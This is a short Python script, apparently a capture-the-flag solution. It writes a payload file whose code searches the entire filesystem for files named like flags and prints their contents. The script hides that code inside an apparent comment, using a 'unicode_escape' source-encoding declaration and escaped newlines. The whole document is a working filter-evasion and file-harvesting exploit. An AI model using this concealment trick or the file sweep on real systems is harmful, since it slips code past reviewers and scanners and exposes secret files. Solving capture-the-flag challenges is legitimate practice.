code = (
    "import os, re\n"
    "pat = re.compile(r'alfactf\\{[^}]*\\}')\n"
    "hits = []\n"
    "for r, ds, fs in os.walk('/'):\n"
    "    if r.startswith('/proc') or r.startswith('/sys') or r.startswith('/dev'):\n"
    "        ds[:] = []\n"
    "        continue\n"
    "    for name in fs + ds:\n"
    "        full = r.rstrip('/') + '/' + name\n"
    "        low = name.lower()\n"
    "        if pat.search(name) or pat.search(full) or 'flag' in low or 'alfactf' in low:\n"
    "            hits.append(full)\n"
    "print('=== name hits ===')\n"
    "for h in hits:\n"
    "    print(h)\n"
    "    try:\n"
    "        with open(h, 'rb') as f:\n"
    "            data = f.read(2000)\n"
    "        print('  >>>', data[:500])\n"
    "    except Exception as e:\n"
    "        print('  ERR', e)\n"
)
encoded = code.replace('\n', '\\u000a')
content = b'# coding: unicode_escape\n#\\u000a' + encoded.encode()
open('payload3.py', 'wb').write(content)
print(open('payload3.py').read())
